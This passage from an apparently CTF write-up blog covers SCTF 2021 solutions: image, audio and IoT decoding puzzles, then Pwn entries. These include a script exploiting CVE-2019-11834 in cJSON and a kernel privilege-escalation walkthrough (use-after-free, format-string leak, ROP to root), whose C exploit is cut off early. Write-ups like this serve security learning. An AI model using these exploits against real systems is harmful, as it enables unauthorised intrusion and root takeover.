class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># MiaoTony</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># from pwn import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># host = &#x27;124.70.150.39&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># port = 2333</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = remote(host, port)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = r.recvall()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(s[:100])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(s[-100:])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># with open(&#x27;data&#x27;, &#x27;wb&#x27;) as f:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     f.write(s)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;TpMSkq.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># img.show()</span></span><br><span class="line"></span><br><span class="line">img.size</span><br><span class="line"></span><br><span class="line"><span class="comment"># (900, 1200)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 纵向来提取</span></span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, img.size[<span class="number">0</span>], <span class="number">9</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, img.size[<span class="number">1</span>]-<span class="number">9</span>, <span class="number">9</span>):</span><br><span class="line"></span><br><span class="line">        r, g, b, a = img.getpixel((i, j))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(r, g, b, a)</span><br><span class="line"></span><br><span class="line">        data.append((r, g, b))</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 13300</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;colors2&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">    f.write(<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data2.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">    s = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data1.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">    s += f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(s)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s[:100]</span></span><br><span class="line"></span><br><span class="line">l = re.findall(<span class="string">b&#x27;\x1b\[38;2;(\d+);(\d+);(\d+)m&#x27;</span>, s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(l)</span></span><br><span class="line"></span><br><span class="line">colors = [<span class="built_in">tuple</span>(<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> j) <span class="keyword">for</span> j <span class="keyword">in</span> l]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(colors))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6650</span></span><br><span class="line"></span><br><span class="line">data_new = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(colors)):</span><br><span class="line"></span><br><span class="line">    x = ()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line"></span><br><span class="line">        tmp = data[i][j] ^ colors[i][j]</span><br><span class="line"></span><br><span class="line">        x += (tmp,)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line">    data_new.append(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data_xor.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">    f.write(<span class="built_in">str</span>(data_new))</span><br><span class="line"></span><br><span class="line">img1 = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">133</span>, <span class="number">100</span>), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line"></span><br><span class="line">img1.putdata(data_new)</span><br><span class="line"></span><br><span class="line">img1.save(<span class="string">&#x27;out.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">img1.show()</span><br></pre></td></tr></table></figure>

<p><img src="../images/2021-12-25-SCTF/20211228082940663.jpg" alt="img"></p>
<p>翻转旋转一下得到 flag</p>
<p>SCTF{Good_FuMo_CTF_OvO}</p>
<h3><span id="in-the-vaporwaves">in_the_vaporwaves</span><a href="#in-the-vaporwaves" class="header-anchor"></a></h3><blockquote>
<p>something in the vaporwaves(题目flag格式为 SCTF(.<em>) 请自行加上花括号为 SCTF{.</em>} 提交)</p>
</blockquote>
<blockquote>
<p>附件链接：<a href="https://pan.baidu.com/s/1W9RISgb8O7WxX_P09IiEpA">https://pan.baidu.com/s/1W9RISgb8O7WxX_P09IiEpA</a></p>
</blockquote>
<blockquote>
<p>提取码：sctf</p>
</blockquote>
<p><img src="../images/2021-12-25-SCTF/20211228082942056.jpg" alt="img"></p>
<p>修改频谱大一点  mose解密</p>
<p><img src="../images/2021-12-25-SCTF/20211228082941119.jpg" alt="img"></p>
<h3><span id="easydsp">easydsp</span><a href="#easydsp" class="header-anchor"></a></h3><p>题目附件包含 4 个数据文件，每个数据文件为 126000 个浮点数。参考题目描述，将数据文件按照音频文件理解，转换为 wav （适当压缩幅度），可以听到四段音乐混合不同类型的杂音。考虑到样本点幅度超过了 -1 ~ 1 的范围，猜测出题人可能将两段音频文件直接加在了一起，因此尝试了一下计算 data1 - data2 的结果，画图如下</p>
<p><img src="../images/2021-12-25-SCTF/20211228082941973.jpg" alt="img"></p>
<p>可以从差值中看出采用了类似 BPSK 调制方式进行编码，周期为 1000 个采样点。完整的文件可以编码 126 bit 内容。126 不是 8 的倍数，是 7 的倍数，猜测有可能是使用 7bit 编码一个字符的方式。一些尝试后可还原出 flag 的内容。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">data = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line"></span><br><span class="line">    data.append(np.array(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">float</span>, <span class="built_in">open</span>(<span class="string">f&#x27;data<span class="subst">&#123;i&#125;</span>.txt&#x27;</span>).read().strip().splitlines()))))</span><br><span class="line"></span><br><span class="line">diff = data[<span class="number">0</span>] - data[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_bit</span>(<span class="params">x</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span> np.<span class="built_in">sum</span>(x[<span class="number">200</span>:<span class="number">300</span>]) / <span class="number">100</span> &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">bits = [get_bit(diff[d:d + <span class="number">1000</span>]) <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">126000</span>, <span class="number">1000</span>)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(bits)</span><br><span class="line"></span><br><span class="line">t = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bits)):</span><br><span class="line"></span><br><span class="line">    t = (t &lt;&lt; <span class="number">1</span>) + bits[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">7</span> == <span class="number">6</span>:</span><br><span class="line"></span><br><span class="line">        flag.append(<span class="built_in">chr</span>(t))</span><br><span class="line"></span><br><span class="line">        t = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(<span class="string">&#x27;&#x27;</span>.join(flag)))</span><br></pre></td></tr></table></figure>

<h3><span id="easyiot">easyiot</span><a href="#easyiot" class="header-anchor"></a></h3><p>题目给了一个用户程序、一个加密后的文件和一个内核模块。用户程序把一个文本文件（device_tree.txt）逐字符 RSA 加密输出。由于加密方式是一一映射，可以通过加密后结果出现的频率与字符出现频率对照大大缩小爆破的空间，此处可通过爆破的方式得到 RSA 的参数 (n &#x3D; 391, d &#x3D; 305)，不过这个参数实际上在内核模块中也有，不需要爆破。。得到参数后解密 device_tree.txt 内容如下</p>
<blockquote>
<p>Congratulations on helping B find the device tree plug-in,Here are some tips, Embedded Engineer A, wants to send a message requesting a connection to the server using an IoT device Distribute up to once, and the server clears the session after it receives it, and the server kicks the device off after more than 2 minutes of idleness.This message appears on the screen of the IoT device (read as normal) Can you get the data that A enters into the IoT device? (Remember to put “sctf{}” on it)</p>
</blockquote>
<p>逆向内核模块逻辑可得 user password 内容为 <code>chengdu106520013</code> （AES 解密），以及一个比较正常的 LED 显示输出的逻辑（可以从 <a href="https://github.com/Embedfire/embed_linux_tutorial/tree/master/base_code/linux_driver/ecSPI_OLED">https://github.com/Embedfire/embed_linux_tutorial/tree/master/base_code/linux_driver/ecSPI_OLED</a> 找到修改前的源码）。</p>
<p>仅通过 device_tree.txt 的内容没有脑洞出来这些和 flag 的关系是怎样的。。。在看到 hint 给出的 message 之后，可以看到 MQTT 相关的信息，猜测可能是想把 MQTT 报文内容作为 flag 提交。在一番与出题人确认信息后（比如相比标准协议少掉一个字节是什么情况），又注意到 LED 输出的部分排序方式与正常不太一样，驱动中实现的是逐列输出，如果想“正常读出”的话需要做转置。多次尝试后终于拼出了正确的 flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">context.endian = <span class="string">&#x27;big&#x27;</span></span><br><span class="line"></span><br><span class="line">client_id = <span class="string">b&quot;21&quot;</span></span><br><span class="line"></span><br><span class="line">user = <span class="string">b&#x27;A&#x27;</span></span><br><span class="line"></span><br><span class="line">password = <span class="string">b&#x27;chengdu106520013&#x27;</span></span><br><span class="line"></span><br><span class="line">datalen = <span class="number">10</span> + <span class="built_in">len</span>(client_id) + <span class="number">2</span> + <span class="built_in">len</span>(user) + <span class="number">2</span> + <span class="built_in">len</span>(password) + <span class="number">2</span> - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">buf = <span class="string">b&quot;\x10&quot;</span> + <span class="built_in">bytes</span>([datalen, <span class="number">4</span>]) + <span class="string">b&#x27;MQTT&#x27;</span> + <span class="string">b&quot;\x04&quot;</span> + <span class="string">b&quot;\xc2\x00\x50&quot;</span> + p16(<span class="built_in">len</span>(client_id)) + client_id + p16(<span class="built_in">len</span>(user)) + user + p16(<span class="built_in">len</span>(password)) + password</span><br><span class="line"></span><br><span class="line">pkt = binascii.hexlify(buf).upper().decode()</span><br><span class="line"></span><br><span class="line">reorder = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">12</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(pkt), <span class="number">12</span>):</span><br><span class="line"></span><br><span class="line">        reorder += pkt[i + j]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;sctf&#123;&#x27;</span> + reorder + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h1><span id="pwn">Pwn</span><a href="#pwn" class="header-anchor"></a></h1><h3><span id="dataleak">dataleak</span><a href="#dataleak" class="header-anchor"></a></h3><p>CVE-2019-11834 直接泄露即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&#x27;./cJSON_PWN&#x27;)</span></span><br><span class="line"></span><br><span class="line">sh= remote(<span class="string">&#x27;124.70.202.226&#x27;</span>,<span class="number">2101</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh,&#x27;b * $rebase(0x120d)&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;/*&quot;</span>.rjust(<span class="number">0xe</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = payload.ljust(0xe,&#x27;a&#x27;)</span></span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">&quot;aaaa/*&quot;</span>.ljust(<span class="number">0xe</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;b&quot;</span> * (<span class="number">0xb</span>-<span class="number">6</span>) +<span class="string">&quot;/*&quot;</span></span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0xe</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">&quot;/*&quot;</span>.ljust(<span class="number">0xe</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3><span id="flyingkernel">flyingkernel</span><a href="#flyingkernel" class="header-anchor"></a></h3><p>This was the only kernel challenge for SCTF this year.</p>
<p>The vulnerable device driver was &#x2F;dev&#x2F;seven.</p>
<p>They were multiple vulnerabilities that when combined can lead to LPE.</p>
<p>You can allocate a chunk of size 0x80 using the command <code>0x5555</code> in ioctl.</p>
<p>Using the command <code>0x6666</code> you can get that chunk freed but not nulled (UAF).</p>
<p>The last ioclt command was <code>0x7777</code> we can use this to get format string attack and bypass KASLR.</p>
<p>And the most important thing is that SMAP is disabled, which means if we can get our leaks using</p>
<p>the format string attack and then get RIP, we can pivot our stack and just ROP ; commit_creds(prepare_kernel_cred(0)) and swapgs iretq.</p>
<p>So now we have UAF on a chunk with size 0x80, which means it will get the chunk from kmalloc-128</p>
<p>The problem is that there are not much structs we can target for this specific slab.</p>
<p>But good for use there is <code>struct subprocess_info</code> which can give RIP control.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">struct subprocess_info &#123;</span><br><span class="line"></span><br><span class="line">        struct work_struct work;</span><br><span class="line"></span><br><span class="line">        struct completion *complete;</span><br><span class="line"></span><br><span class="line">        const char *path;</span><br><span class="line"></span><br><span class="line">        char **argv;</span><br><span class="line"></span><br><span class="line">        char **envp;</span><br><span class="line"></span><br><span class="line">        int wait;</span><br><span class="line"></span><br><span class="line">        int retval;</span><br><span class="line"></span><br><span class="line">        int (*init)(struct subprocess_info *info, struct cred *new);</span><br><span class="line"></span><br><span class="line">        void (*cleanup)(struct subprocess_info *info);</span><br><span class="line"></span><br><span class="line">        void *data;</span><br><span class="line"></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<p>if we can control <code>cleanup</code> we can control rip (but we have to be quick, this struct is allocated and it uses cleanup quickly).</p>
<p>You can allocate this struct just using this line of code : socket(22, AF_INET, 0); it’s okey if it fails and return -1 it will still be allocated.</p>
<p>So the plan is this:</p>
<ul>
<li><p>Take advantage of the format string vuln to get leaks (don’t use %p they are detected by the kernel as information leak and it will show up as <em><strong>ptr</strong></em> and not the actual value in my exploit I provided %lld) and now we have the kernel base.</p>
</li>
<li><p>Free that chunk and execute that socket() to get advantage of the UAF and overwrite cleanup with a gadget, in my case it was</p>
</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0xffffffff816e19bc</span>:        mov    esp,<span class="number">0</span>x83000000</span><br><span class="line"></span><br><span class="line"><span class="attribute">0xffffffff816e19c1</span>:        ret</span><br></pre></td></tr></table></figure>

<ul>
<li><p>I mentioned that we should be quick to overwrite that (so that our gadget gets executed and not the actual cleanup value). userfault_fd was not available to make the race reliable. What I did was I spawned a thread which write to &#x2F;dev&#x2F;seven in infinite loop, and hope for cleanup to be overwritten before use.</p>
</li>
<li><p>mmap that region of memory and put our ROP there, elevate our privs and execute shell.</p>
</li>
</ul>
<p>The complete exploit:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;assert.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;sys/ioctl.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line"></span><br><span class="line">int fd;</span><br><span class="line"></span><br><span class="line">// We can launch ioctl / read / write for this device driver.</span><br><span class="line"></span><br><span class="line">// For ioctl command we have:</span><br><span class="line"></span><br><span class="line">// 0x6666 for UAF</span><br><span class="line"></span><br><span class="line">// 0x7777 for Fmt string vuln</span><br><span class="line"></span><br><span class="line">// 0x5555 alloc of size 0x80</span><br><span class="line"></span><br><span class="line">#define ALLOC         0x5555</span><br><span class="line"></span><br><span class="line">#define UAF                0x6666</span><br><span class="line"></span><br><span class="line">#define GET                0x7777</span><br><span class="line"></span><br><span class="line">struct trap_frame&#123;</span><br><span class="line"></span><br><span class="line">        char* rip;</span><br><span class="line"></span><br><span class="line">        unsigned long cs;</span><br><span class="line"></span><br><span class="line">        unsigned long rflags;</span><br><span class="line"></span><br><span class="line">  